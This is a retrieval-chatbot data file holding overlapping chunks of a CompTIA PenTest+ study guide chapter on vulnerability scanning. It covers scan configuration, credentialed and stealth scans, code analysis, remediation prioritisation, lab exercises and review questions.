rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	that they involve. Disabling unnecessary plug‐ins improves the speed of the scan by bypassing unnecessary checks and also may reduce the number of false positive results detected by the scanner. For example, an organization that does not use the Amazon Linux operating system may choose to disable all checks related to Amazon Linux in its scanning template. Figure 4.6 shows an example of disabling these plug‐ins in Nessus. Similarly, an organization that blocks the use of some protocols at the network firewall may not wish to consume time performing external scans using those protocols. FIGURE 4.6 Disabling unused plug‐ins Scanning Fragile Systems Some plug‐in scan tools perform tests that may actually disrupt activity on a fragile production system or, in the worst case, damage content on those systems. These plug‐ins present a tricky situation. Administrators want to run the scans because they may identify problems that could be exploited by a malicious source. At the same time, cybersecurity professionals clearly don't want to cause problems on the organization's network! These concerns are heightened on networks containing nontraditional computing assets, such as networks containing industrial control systems (ICSs), Internet of Things (IoT) devices, specialized medical equipment, or other potentially fragile systems. Although penetration tests should uncover deficiencies in these systems, it is not desirable to disrupt production activity with poorly configured scans if at all avoidable. One way around this problem is to maintain a test environment containing copies of the same systems running on the production network and running scans against those test systems first. If the scans detect problems in the test environment, administrators may correct the underlying causes on both test and production networks before running scans on the production network. Scan Techniques During penetration tests, testers may wish to configure their scans to run as stealth scans, which go to great lengths to avoid using tests that might attract attention. The default operating mode of most scanners is to use Transmission Control Protocol (TCP) connect scans, which simply initiate a TCP connection to the target system and probe it for vulnerabilities. This is incredibly noisy and will definitely attract the attention of an observant administrator. Although it might be appropriate for advertised scanning, it often doesn't work well for a penetration test. Testers may also use the User Datagram Protocol (UDP) to perform scans. Unlike TCP, UDP does not establish a connection and is therefore less noticeable. However, UDP scans can be slower and more complex due to the connectionless nature of UDP. They are essential for a thorough examination, as some services only listen on UDP ports. Including UDP scans helps ensure that less conspicuous services, which might not be checked during a standard TCP scan, are also tested for vulnerabilities. The use of stealth scans is especially important if the organization's cybersecurity team is not aware that a penetration test is underway. Service disruptions, error messages, and log entries caused by scans may attract attention from the cybersecurity team that causes them to adjust defenses
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	However, UDP scans can be slower and more complex due to the connectionless nature of UDP. They are essential for a thorough examination, as some services only listen on UDP ports. Including UDP scans helps ensure that less conspicuous services, which might not be checked during a standard TCP scan, are also tested for vulnerabilities. The use of stealth scans is especially important if the organization's cybersecurity team is not aware that a penetration test is underway. Service disruptions, error messages, and log entries caused by scans may attract attention from the cybersecurity team that causes them to adjust defenses in a manner that obstructs the penetration test. Using stealth scans better approximates the activity of a skilled attacker, resulting in a more realistic penetration test. Supplementing Network Scans Basic vulnerability scans run over a network, probing a system from a distance. This provides a realistic view of the system's security by simulating what an attacker might see from another network vantage point. However, the firewalls, intrusion prevention systems, and other security controls that exist on the path between the scanner and the target server may affect the scan results, providing an inaccurate view of the server's security independent of those controls. Additionally, many security vulnerabilities are difficult to confirm using only a remote scan. Vulnerability scans that run over the network may detect the possibility that a vulnerability exists but be unable to confirm it with confidence, causing a false positive result that requires time‐ consuming administrator investigation. Virtualization and Container Security Many IT organizations embrace virtualization and container technology as a means to improve the efficiency of their resource utilization. Virtualization approaches allow administrators to run many virtual “guest” operating systems on a single physical “host” system. This allows the guests to share CPUs, memory, storage, network connectivity, and other resources. It also allows administrators to quickly reallocate resources as needs shift. Containerization takes virtualization technology a step higher up in the stack. Instead of merely running on shared hardware, as is the case with virtual machines, containers run on a shared operating system but still provide the portability and dynamic allocation capabilities of virtualization. Administrators and penetration testers working in both virtualized and containerized environments should pay careful attention to how the interactions between components in those environments may affect the results of vulnerability scans. For example, network communications between virtual machines or containerized applications may take place entirely within the confines of the virtualization or containerization environment using virtual networks that exist in memory on a host. Services exposed only within those environments may not be detectable by traditional network‐based vulnerability scanning. Agent‐based scans may work in a more effective manner in these environments. Many vulnerability management tools are also now virtualization‐ and containerization‐aware, allowing them to process configuration and vulnerability information for components contained within these environments. Modern vulnerability management solutions can supplement these remote scans with trusted information about server configurations. This information may be gathered in two ways. First, administrators can provide the
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	place entirely within the confines of the virtualization or containerization environment using virtual networks that exist in memory on a host. Services exposed only within those environments may not be detectable by traditional network‐based vulnerability scanning. Agent‐based scans may work in a more effective manner in these environments. Many vulnerability management tools are also now virtualization‐ and containerization‐aware, allowing them to process configuration and vulnerability information for components contained within these environments. Modern vulnerability management solutions can supplement these remote scans with trusted information about server configurations. This information may be gathered in two ways. First, administrators can provide the scanner with credentials that allow the scanner to connect to the target server and retrieve configuration information. This is known as an authenticated scan. The information gathered during an authenticated scan can then be used to determine whether a vulnerability exists, improving the scan's accuracy over that of an unauthenticated scan. For example, if a vulnerability scan detects a potential issue that can be corrected by an operating system update, the credentialed scan can check whether the update is installed on the system before reporting a vulnerability. Authenticated scans are widely used in enterprise vulnerability management programs, and it may be fair game to use them in penetration tests as well. However, this depends on the parameters of the penetration test and whether the testing team is supposed to have full access to internal information as they conduct their work. If a penetration test is intended to be an unknown environment exercise, providing the team with results of credentialed vulnerability scans would normally be outside the bounds of the test. As always, if questions exist about what is or is not appropriate during a penetration test, consult the agreed‐upon SOW. Figure 4.7 shows an example of the credentialed scanning options available within Qualys. Credentialed scans may access operating systems, databases, and applications, among other sources. FIGURE 4.7 Configuring authenticated scanning Credentialed scans typically only retrieve information from target servers and do not make changes to the server itself. Therefore, administrators should enforce the principle of least privilege by providing the scanner with a read‐only account on the server. This reduces the likelihood of a security incident related to the scanner's credentialed access. In addition to credentialed scanning, some scanners supplement the traditional server‐based approach to vulnerability scanning with a complementary host‐based approach. In this approach, administrators install small software agents on each target server. These agents conduct scans of the server configuration, providing an “inside‐out” vulnerability scan, and then report information back to the vulnerability management platform for analysis and reporting. System administrators are typically wary of installing agents on the servers that they manage for fear that the agent will cause performance or stability issues. If you choose to use an agent‐based approach to scanning, you should approach this concept conservatively, beginning with a small pilot deployment that builds confidence in the agent before proceeding with a more widespread deployment. Scan Perspective Comprehensive vulnerability management programs provide the ability
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	on each target server. These agents conduct scans of the server configuration, providing an “inside‐out” vulnerability scan, and then report information back to the vulnerability management platform for analysis and reporting. System administrators are typically wary of installing agents on the servers that they manage for fear that the agent will cause performance or stability issues. If you choose to use an agent‐based approach to scanning, you should approach this concept conservatively, beginning with a small pilot deployment that builds confidence in the agent before proceeding with a more widespread deployment. Scan Perspective Comprehensive vulnerability management programs provide the ability to conduct scans from a variety of scan perspectives. Each scan perspective conducts the scan from a different location on the network, providing a different view into vulnerabilities. Penetration testers must be keenly aware of the network topology of the environments undergoing testing and how the location of their tools on the network may affect scan results. For example, an external scan is run from the Internet, giving administrators a view of what an attacker located outside the organization would see as potential vulnerabilities. Internal scans might run from a scanner on the general corporate network, providing the view that a malicious insider might encounter. Finally, scanners located inside the data center and agents located on the servers offer the most accurate view of the real state of the server by showing vulnerabilities that might be blocked by other security controls on the network. The internal and external scans required by PCI DSS are a good example of scans performed from different perspectives. The organization may conduct its own internal scans but must supplement them with external scans conducted by an approved scanning vendor. Vulnerability management platforms have the ability to manage different scanners and provide a consolidated view of scan results, compiling data from different sources. Figure 4.8 shows an example of how the administrator may select the scanner for a newly configured scan using Qualys. FIGURE 4.8 Choosing a scan appliance As they do when choosing whether to use the results of credentialed scans, penetration testers should exercise caution and consult the statement of work when determining the appropriate scan perspectives for use during a test. Penetration testers should not have access to scans run using an internal perspective if they are conducting an unknown environment penetration test. Scanner Maintenance Like any technology product, vulnerability management solutions require care and feeding. Administrators should conduct regular maintenance of their vulnerability scanner to ensure that the scanning software and vulnerability feeds remain up‐to‐date. Scanning systems do provide automatic updating capabilities that keep the scanner and its vulnerability feeds up‐to‐date. Organizations can and should take advantage of these features, but it is always a good idea to check in once in a while and manually verify that the scanner is updating properly. Scanner Software Scanning systems themselves aren't immune from vulnerabilities. As shown in Figure 4.9, even vulnerability scanners can have security issues! Regular patching of scanner software protects an organization
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	care and feeding. Administrators should conduct regular maintenance of their vulnerability scanner to ensure that the scanning software and vulnerability feeds remain up‐to‐date. Scanning systems do provide automatic updating capabilities that keep the scanner and its vulnerability feeds up‐to‐date. Organizations can and should take advantage of these features, but it is always a good idea to check in once in a while and manually verify that the scanner is updating properly. Scanner Software Scanning systems themselves aren't immune from vulnerabilities. As shown in Figure 4.9, even vulnerability scanners can have security issues! Regular patching of scanner software protects an organization against scanner‐ specific vulnerabilities and also provides important bug fixes and feature enhancements to improve scan quality. Vulnerability Plug‐In Feeds Security researchers discover new vulnerabilities every week, and vulnerability scanners can only be effective against these vulnerabilities if they receive frequent updates to their plug‐ins. Administrators should configure their scanners to retrieve new plug‐ins on a regular basis, preferably daily. Fortunately, as shown in Figure 4.10, this process is easily automated. Security Content Automation Protocol (SCAP) The Security Content Automation Protocol (SCAP) is an effort by the security community, led by the National Institute of Standards and Technology (NIST), to create a standardized approach for communicating security‐related information. This standardization is important to the automation of interactions between security components. The SCAP standards include the following: Common Configuration Enumeration (CCE) Provides a standard nomenclature for discussing system configuration issues. Common Platform Enumeration (CPE) Provides a standard nomenclature for describing product names and versions. Common Vulnerabilities and Exposures (CVE) Provides a standard nomenclature for describing security‐related software flaws. Common Vulnerability Scoring System (CVSS) Provides a standardized approach for measuring and describing the severity of security‐related software flaws. Extensible Configuration Checklist Description Format (XCCDF) Is a language for specifying checklists and reporting checklist results. Open Vulnerability and Assessment Language (OVAL) Is a language for specifying low‐level testing procedures used by checklists. For more information on SCAP, see the SCAP website (https://csrc.nist.gov/projects/security-content-automation-protocol). You may also be interested in exploring the OpenSCAP project (www.open-scap.org), which provides a set of open source tools that implement the SCAP standard. FIGURE 4.9 National Cyber Awareness System Vulnerability Summary Source: NIST FIGURE 4.10 Setting automatic updates in Nessus Software Security Testing No matter how skilled the development team for an application is, there will be some flaws in their code, and penetration testers should include tools that test software security in their toolkits. Veracode's 2024 metrics for applications based on its testing showed that 46 percent of the organizations they studied had “persistent, high severity flaws that constitute critical security debt.” That number points to a massive need for continued better integration of software security testing into the software development life cycle. In addition to the preceding statistics, Veracode provides a useful yearly review of the state of software security. You can read more of the 2024 report at https://www.veracode.com/state-software-security-2024-report. A broad variety of manual and automatic testing tools and methods are available to penetration testers and developers
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	software security in their toolkits. Veracode's 2024 metrics for applications based on its testing showed that 46 percent of the organizations they studied had “persistent, high severity flaws that constitute critical security debt.” That number points to a massive need for continued better integration of software security testing into the software development life cycle. In addition to the preceding statistics, Veracode provides a useful yearly review of the state of software security. You can read more of the 2024 report at https://www.veracode.com/state-software-security-2024-report. A broad variety of manual and automatic testing tools and methods are available to penetration testers and developers alike. Fortunately, automated tools have continued to improve, providing an easier way to test the security of code than performing tedious manual tests. Over the next few pages we will review some of the critical software security testing methods and tools available today. Analyzing and Testing Code The source code that is the basis of every application and program can contain a variety of bugs and flaws, from programming and syntax errors to problems with business logic, error handling, and integration with other services and systems. It is important to be able to analyze the code to understand what the code does, how it performs that task, and where flaws may occur in the program itself. This information may point to critical undiscovered vulnerabilities that may be exploited during a penetration test. Code testing is often done via static or dynamic code analysis along with testing methods like fuzzing and fault injection. Once changes are made to code and it is deployed, it must be regression‐tested to ensure that the fixes put in place didn't create new security issues. Static Code Analysis Static code analysis (sometimes called source code analysis) is conducted by reviewing the code for an application. Since static analysis uses the source code for an application, it can be seen as a type of known‐ environment testing, with full visibility to the testers. This can allow testers to find problems that other tests might miss, either because the logic is not exposed to other testing methods or because of internal business logic problems. Unlike many other methods, static analysis does not run the program being analyzed; instead, it focuses on understanding how the program is written and what the code is intended to do. Static code analysis can be conducted using automated tools or manually by reviewing the code—a process sometimes called “code understanding.” Automated static code analysis can be very effective at finding known issues, and manual static code analysis helps to identify programmer‐induced errors. OWASP provides static code analysis tools for .NET, Java, PHP, and MySQL, as well as a list of other static code analysis tools, at https://owasp.org/www-community/controls/Static_Code_Analysis. Dynamic Code Analysis Dynamic code analysis relies on execution of the code while providing it with input to test the software. Much like static code analysis, dynamic code analysis may be done via automated tools or manually, but there is a strong preference for automated testing
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	the code—a process sometimes called “code understanding.” Automated static code analysis can be very effective at finding known issues, and manual static code analysis helps to identify programmer‐induced errors. OWASP provides static code analysis tools for .NET, Java, PHP, and MySQL, as well as a list of other static code analysis tools, at https://owasp.org/www-community/controls/Static_Code_Analysis. Dynamic Code Analysis Dynamic code analysis relies on execution of the code while providing it with input to test the software. Much like static code analysis, dynamic code analysis may be done via automated tools or manually, but there is a strong preference for automated testing because of the volume of tests that need to be conducted in most dynamic code testing processes. Penetration testers are much more likely to find themselves able to conduct dynamic analysis of code rather than static analysis because the terms of penetration‐testing SOWs often restrict access to source code. Fuzz Testing Fuzz testing, or fuzzing, involves sending invalid or random data to an application to test its ability to handle unexpected data. The application is monitored to determine if it crashes, fails, or responds in an incorrect manner. Fuzzing is typically automated because of the large amount of data that a fuzz test involves, and it is particularly useful for detecting input validation and logic issues as well as memory leaks and error handling. Fuzz testing can often be performed externally without any privileged access to systems and is therefore a popular technique among penetration testers. However, fuzz testing is also a noisy testing method that may attract undue attention from cybersecurity teams. Web Application Vulnerability Scanning Many of the applications our organizations use today are web‐based, and they offer unique opportunities for testing because of the relative standardization of HTML‐based web interfaces. Earlier in this chapter, we looked at vulnerability scanning tools like Nessus, OpenVAS, and Trivy, which scan for known vulnerabilities in systems, in services, and to a limited extent in web applications. Dedicated web application vulnerability scanners provide an even broader toolset specifically designed to identify problems with applications and their underlying web servers, databases, and infrastructure. Web application scanners can be directly run against an application, but they may also be guided through the application to ensure that they find all the components that you want to test. Like traditional vulnerability scanners, web application scanning tools provide a report of the issues they discovered when they are done, as shown in Figure 4.11. Additional details, including where the issue was found and any remediation guidance, are also typically available by drilling down on the report item. FIGURE 4.11 Acunetix web application scan vulnerability report Nikto is an open source web application scanning tool that is freely available for anyone to use. As shown in Figure 4.12, it uses a command‐ line interface and displays results in text form. You should be familiar with interpreting the results of Nikto scans when taking the exam. FIGURE 4.12 Nikto web application scan results Most organizations do use web application
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	are done, as shown in Figure 4.11. Additional details, including where the issue was found and any remediation guidance, are also typically available by drilling down on the report item. FIGURE 4.11 Acunetix web application scan vulnerability report Nikto is an open source web application scanning tool that is freely available for anyone to use. As shown in Figure 4.12, it uses a command‐ line interface and displays results in text form. You should be familiar with interpreting the results of Nikto scans when taking the exam. FIGURE 4.12 Nikto web application scan results Most organizations do use web application scanners, but they choose to use commercial products that offer advanced capabilities and user‐friendly interfaces. Although there are dedicated web application scanners, such as Nikto, on the market, many firms choose to use the web application scanning capabilities of traditional network vulnerability scanners, such as Nessus, Trivy, and OpenVAS. Figure 4.13 shows an example of Nessus used in a web scanning role. FIGURE 4.13 Nessus web application scanner In addition to using automated web application vulnerability scanners, manual scanning is frequently conducted to identify issues that automated scanners may miss. Manual testing may be fully manual, with inputs inserted by hand, but testers typically use tools called interception proxies that allow them to capture communication between a browser and the web server. Once the proxy captures the information, the tester can modify the data that is sent and received. Developing a Remediation Workflow Vulnerability scans often produce a fairly steady stream of security issues that require attention from cybersecurity professionals, system engineers, software developers, network engineers, and other technologists. The initial scans of an environment can produce an overwhelming number of issues requiring prioritization and eventual remediation. Organizations should develop a remediation workflow that allows for the prioritization of vulnerabilities and the tracking of remediation through the cycle of detection, remediation, and testing shown in Figure 4.14. FIGURE 4.14 Vulnerability management life cycle This remediation workflow should be as automated as possible, given the tools available to the organization. Many vulnerability management products include a built‐in workflow mechanism that allows cybersecurity experts to track vulnerabilities through the remediation process and automatically close out vulnerabilities after testing confirms that the remediation was successful. Although these tools are helpful, other organizations often choose not to use them in favor of tracking vulnerabilities in the IT service management (ITSM) tool that the organization uses for other technology issues. This approach avoids asking technologists to use two different issue‐tracking systems and improves compliance with the remediation process. However, it also requires selecting vulnerability management tools that integrate natively with the organization's ITSM tool (or vice versa) or building an integration between the tools if one does not already exist. Penetration Testing and the Remediation Workflow Penetration tests are often a source of new vulnerability information that an organization eventually feeds into its remediation workflow for prioritization and remediation. The approach used by penetration testers in this area is a common source of tension between
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	uses for other technology issues. This approach avoids asking technologists to use two different issue‐tracking systems and improves compliance with the remediation process. However, it also requires selecting vulnerability management tools that integrate natively with the organization's ITSM tool (or vice versa) or building an integration between the tools if one does not already exist. Penetration Testing and the Remediation Workflow Penetration tests are often a source of new vulnerability information that an organization eventually feeds into its remediation workflow for prioritization and remediation. The approach used by penetration testers in this area is a common source of tension between testers and enterprise cybersecurity teams. The major questions surround the appropriate time to inform security teams of a vulnerability, and there is no clear‐cut answer. As with other areas of potential ambiguity, this is an important issue to address in the SOW. One common approach to this issue is to agree on a threshold for vulnerabilities above which the penetration testers must immediately report their findings to management. For example, if testers find a critical vulnerability that is remotely exploitable by an attacker, this should be corrected immediately and will likely require immediate reporting. Information about lower‐level vulnerabilities, on the other hand, might be withheld for use during the penetration test and only released when the final results are delivered to the client. An important trend in vulnerability management is a shift toward ongoing scanning and continuous monitoring. Ongoing scanning moves away from the scheduled scanning approach that tested systems on a scheduled weekly or monthly basis, and instead configures scanners to simply scan systems on a rotating basis, checking for vulnerabilities as often as scanning resources permit. This approach can be bandwidth‐ and resource‐intensive, but it does provide earlier detection of vulnerabilities. Continuous monitoring incorporates data from agent‐based approaches to vulnerability detection and reports security‐related configuration changes to the vulnerability management platform as soon as they occur, providing the ability to analyze those changes for potential vulnerabilities. Prioritizing Remediation As cybersecurity analysts work their way through vulnerability scanning reports, they must make important decisions about prioritizing remediation to use their limited resources to resolve the issues that pose the greatest danger to the organization. There is no cut‐and‐dried formula for prioritizing vulnerabilities. Rather, analysts must take several important factors into account when choosing where to turn their attention first. Some of the most important factors in the remediation prioritization decision‐making process are listed here: Criticality of the Systems and Information Affected by the Vulnerability Criticality measures should take into account confidentiality, integrity, and availability requirements, depending on the nature of the vulnerability. For example, in the case of availability, if the vulnerability allows a denial‐of‐service attack, cybersecurity analysts should consider the impact to the organization if the system were to become unusable due to an attack. And in the case of confidentiality, if the vulnerability allows the theft of stored information from a database, cybersecurity analysts should consider the impact on the organization if that information were stolen. Last,
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	decision‐making process are listed here: Criticality of the Systems and Information Affected by the Vulnerability Criticality measures should take into account confidentiality, integrity, and availability requirements, depending on the nature of the vulnerability. For example, in the case of availability, if the vulnerability allows a denial‐of‐service attack, cybersecurity analysts should consider the impact to the organization if the system were to become unusable due to an attack. And in the case of confidentiality, if the vulnerability allows the theft of stored information from a database, cybersecurity analysts should consider the impact on the organization if that information were stolen. Last, in the case of integrity, if a vulnerability allows unauthorized changes to information, cybersecurity analysts should consider the impact of those changes. Difficulty of Remediating the Vulnerability If fixing a vulnerability will require an inordinate commitment of human or financial resources, that should be factored into the decision‐ making process. Cybersecurity analysts may find that they can fix five issues rated numbers 2 through 6 in priority for the same investment that would be required to address the top issue alone. This doesn't mean that they should necessarily choose to make that decision based on cost and difficulty alone, but it is a consideration in the prioritization process. Severity of the Vulnerability The more severe an issue is, the more important it is to correct that issue. Analysts may turn to the Common Vulnerability Scoring System (CVSS) to provide relative severity rankings for different vulnerabilities. Remember from earlier in this chapter that CVSS is a component of SCAP. Exposure of the Vulnerability Cybersecurity analysts should also consider how exposed the vulnerability is to potential exploitation. For example, if an internal server has a serious SQL injection vulnerability but that server is only accessible from internal networks, remediating that issue may take a lower priority than remediating a less severe issue that is exposed to the Internet and, therefore, more vulnerable to external attack. Identifying the optimal order of remediating vulnerabilities is more of an art than a science. Cybersecurity analysts must evaluate all the information at their disposal and make informed decisions about the sequence of remediation that will deliver the most security value to their organization. Testing and Implementing Fixes Before deploying any remediation activity, cybersecurity professionals and other technologists should thoroughly test their planned fixes in a sandbox environment. This allows technologists to identify any unforeseen side effects of the fix and reduces the likelihood that remediation activities will disrupt business operations or cause damage to the organization's information assets. Overcoming Barriers to Vulnerability Scanning Vulnerability scanning is often a high priority for cybersecurity professionals, but other technologists in the organization may not see it as an important activity. Cybersecurity analysts should be aware of the barriers raised by others to vulnerability scanning and ways to address those concerns. Some common barriers to overcome are as follows: Service Degradations Service degradations are the barriers to vulnerability scanning most commonly raised by technology professionals. Vulnerability scans consume network bandwidth
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	of the fix and reduces the likelihood that remediation activities will disrupt business operations or cause damage to the organization's information assets. Overcoming Barriers to Vulnerability Scanning Vulnerability scanning is often a high priority for cybersecurity professionals, but other technologists in the organization may not see it as an important activity. Cybersecurity analysts should be aware of the barriers raised by others to vulnerability scanning and ways to address those concerns. Some common barriers to overcome are as follows: Service Degradations Service degradations are the barriers to vulnerability scanning most commonly raised by technology professionals. Vulnerability scans consume network bandwidth and tie up the resources on systems that are the targets of scans. This may degrade system functionality and poses a risk of interrupting business processes. Cybersecurity professionals may address these concerns by tuning scans to consume less bandwidth and coordinating scan times with operational schedules. Vulnerability scans of web applications may also use query throttling to limit the rate at which the scanner sends requests to a single web application. Figure 4.15 shows ways that administrators may adjust scan intensity in Qualys. Customer Commitments Certain customer commitments may create barriers to vulnerability scanning. Memorandums of understanding (MOUs) and service‐level agreements (SLAs) with customers may create expectations related to uptime, performance, and security that the organization must fulfill. If scanning will negatively impact the organization's ability to meet customer commitments, customers may need to participate in the decision‐making process. Cybersecurity professionals can avoid issues with MOUs and SLAs by ensuring that they are involved in the creation of those agreements in the first place. Many concerns can be avoided if customer agreements include language that anticipates vulnerability scans and acknowledges that they may have an impact on performance. Most customers will understand the importance of conducting vulnerability scans as long as you provide them with advance notice of the timing and potential impact of scans. IT Governance and Change Management Processes Such processes may create bureaucratic hurdles to making the configuration changes required to support scanning. Cybersecurity analysts should work within these organizational governance processes to obtain the resources and support required to support a vulnerability management program. FIGURE 4.15 Qualys scan performance settings Summary Vulnerability scans provide penetration testers with an invaluable information source as they begin their testing. The results of vulnerability scans identify potentially exploitable systems and may even point to specific exploits that would allow the attacker to gain a foothold on a network or gain elevated privileges after achieving initial access. Anyone conducting a vulnerability scan should begin by identifying the scan requirements. This includes a review of possible scan targets and the selection of scan frequencies. Once these early decisions are made, analysts may configure and execute vulnerability scans on a regular basis, preferably through the use of automated scan scheduling systems. In Chapter 5, “Analyzing Vulnerability Scans,” you'll learn how to analyze the results of vulnerability scans and use those results in a penetration test. Exam Essentials Vulnerability scans automate some of the
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	attacker to gain a foothold on a network or gain elevated privileges after achieving initial access. Anyone conducting a vulnerability scan should begin by identifying the scan requirements. This includes a review of possible scan targets and the selection of scan frequencies. Once these early decisions are made, analysts may configure and execute vulnerability scans on a regular basis, preferably through the use of automated scan scheduling systems. In Chapter 5, “Analyzing Vulnerability Scans,” you'll learn how to analyze the results of vulnerability scans and use those results in a penetration test. Exam Essentials Vulnerability scans automate some of the tedious work of penetration testing. Automated vulnerability scanners allow penetration testers to rapidly check large numbers of systems for the presence of known vulnerabilities. Although this greatly speeds up the work of a penetration tester, the scan may also attract attention from cybersecurity professionals. Scan targets should be selected based on the results of discovery scans. Discovery scans provide penetration testers with an automated way to identify hosts that exist on the network and build an asset inventory. They may then select scan targets based on the likelihood that it will advance the goals of the penetration test. This may include information about data classification, system exposure, services offered, and the status of the system as a test, development, or production environment. Discovery scans may use a combination of TCP scans, UDP scans, and/or stealth scans to identify systems present on the network. Configuring scan settings allows customization to meet the tester's requirements. Penetration testers may customize scans by configuring the sensitivity level, including and excluding plug‐ins, and supplementing basic network scans with information gathered from authenticated and unauthenticated scans as well as network‐based and host‐based scans. Teams may also conduct scans from more than one scan perspective, providing different views of the network. Vulnerability scanners require maintenance like any other technology tool. Administrators responsible for maintaining vulnerability scanning systems should perform two important administrative tasks. First, they should update the scanner software on a regular basis to correct security issues and add new functionality. Second, they should update plug‐ins frequently to provide the most accurate and up‐to‐date vulnerability scans of their environment. Organizations should use a consistent remediation workflow to identify, remediate, and test vulnerabilities. Remediation workflows should be as automated as possible and integrate with other workflow technology used by the IT organization. As technologists correct vulnerabilities, they should validate that the remediation was effective through security testing and close out the vulnerability in the tracking system. Penetration test SOWs should carefully define how and when vulnerabilities detected during tests are fed into the organization's remediation workflow. Penetration testers must be prepared to overcome objections to scanning from other members of the IT team. Common objections to vulnerability scanning include the effect that service degradation caused by scanning will have on IT services, commitments to customers in MOUs and SLAs, and the use of IT governance and change management processes. Penetration testers use a variety of tools to
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	should validate that the remediation was effective through security testing and close out the vulnerability in the tracking system. Penetration test SOWs should carefully define how and when vulnerabilities detected during tests are fed into the organization's remediation workflow. Penetration testers must be prepared to overcome objections to scanning from other members of the IT team. Common objections to vulnerability scanning include the effect that service degradation caused by scanning will have on IT services, commitments to customers in MOUs and SLAs, and the use of IT governance and change management processes. Penetration testers use a variety of tools to discover vulnerabilities. Nessus is a popular commercial network vulnerability scanning tool. Greenbone OpenVAS is an open source alternative that also performs network vulnerability scanning. Nikto is a tool that specializes in scanning web applications, while Trivy specializes in scanning containerized systems. Lab Exercises Activity 4.1: Installing a Vulnerability Scanner In this lab, you will install the Nessus vulnerability management package on a system. This lab requires access to a Linux system that you can use to install Nessus (preferably Ubuntu, Debian, Red Hat, SUSE, or Fedora). Part 1: Obtain a Nessus Essentials Activation Code Visit the Nessus website (https://www.tenable.com/products/nessus/nessus-essentials) and fill out the form to obtain an activation code. Save the email containing the code for use during the installation and activation process. Part 2: Download Nessus and Install It on Your System Visit the Nessus download page (www.tenable.com/downloads/nessus) and download the appropriate version of Nessus for your system. Install Nessus following the documentation available at https://docs.tenable.com/Nessus.htm. Verify that your installation was successful by logging into your Nessus server. Activity 4.2: Running a Vulnerability Scan In this lab, you will run a vulnerability scan against a server of your choice. It is important to note that you should never run a vulnerability scan without permission. You will need access to both your vulnerability scanning server that you built in Activity 4.1 and a target server for your scan. If there is no server that you currently have permission to scan, you may build one using a cloud service provider, such as Amazon Web Services, Microsoft Azure, or Google Compute Platform. You also may wish to scan your home network as an alternative. You might be surprised at some of the vulnerabilities that you find lurking in your “smart” home devices! Conduct a vulnerability scan against your server and save the resulting report. If you need assistance, consult the Nessus documentation. You will need the report from this vulnerability scan to complete the activities in the next chapter. Activity 4.3: Developing a Penetration Test Vulnerability Scanning Plan In the scenario at the start of this chapter, you were asked to think about how you might deploy various vulnerability scanning techniques in the MCDS, LLC penetration test. Using the knowledge that you gained in this chapter, develop a vulnerability testing plan that answers the following questions: How would you scope a vulnerability scan for the MCDS networks? What limitations would you impose
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	resulting report. If you need assistance, consult the Nessus documentation. You will need the report from this vulnerability scan to complete the activities in the next chapter. Activity 4.3: Developing a Penetration Test Vulnerability Scanning Plan In the scenario at the start of this chapter, you were asked to think about how you might deploy various vulnerability scanning techniques in the MCDS, LLC penetration test. Using the knowledge that you gained in this chapter, develop a vulnerability testing plan that answers the following questions: How would you scope a vulnerability scan for the MCDS networks? What limitations would you impose on the scan? Would you limit the scan to services that you suspect are running on MCDS hosts from your Nmap results, or would you conduct full scans? Will you attempt to run your scans in a stealthy manner to avoid detection by the MCDS cybersecurity team? Will you supplement your network vulnerability scans with web application scans and/or database scans? Can the scan achieve multiple goals simultaneously? For example, may the scan results be used to detect configuration compliance with organizational standards? Or might they feed into an automated remediation workflow? Use the answers to these questions to create a vulnerability scanning plan for your penetration test. Review Questions You can find the answers in the Appendix A. 1. Ryan is conducting a penetration test and is targeting a containerized server platform. Which one of the following tools would best assist him in detecting vulnerabilities on that server? A. Nessus B. Nikto C. Trivy D. OpenVAS 2. Gary is conducting an unknown environment penetration test against an organization and is being provided with the results of vulnerability scans that the organization already ran for use in his tests. Which one of the following scans is most likely to provide him with helpful information within the bounds of his test? A. Stealth internal scan B. Full internal scan C. Stealth external scan D. Full external scan 3. What tool can known environment penetration testers use to help identify the systems present on a network prior to conducting vulnerability scans? A. Asset inventory B. Web application assessment C. Router D. DLP 4. Tonya is configuring vulnerability scans for a system that is subject to the PCI DSS compliance standard. What is the minimum frequency with which she must conduct scans? A. Daily B. Weekly C. Monthly D. Quarterly 5. Which one of the following is not an example of a vulnerability scanning tool? A. Qualys B. Snort C. Nessus D. OpenVAS 6. Which one of the following technologies, when used within an organization, is the least likely to interfere with vulnerability scanning results achieved by external penetration testers? A. Encryption B. Firewall C. Containerization D. Intrusion prevention system 7. Renee is configuring her vulnerability management solution to perform credentialed scans of servers on her network. What type of account should she provide to the scanner? A. Domain administrator B. Local administrator C. Root D. Read‐only 8. Jason is writing a report
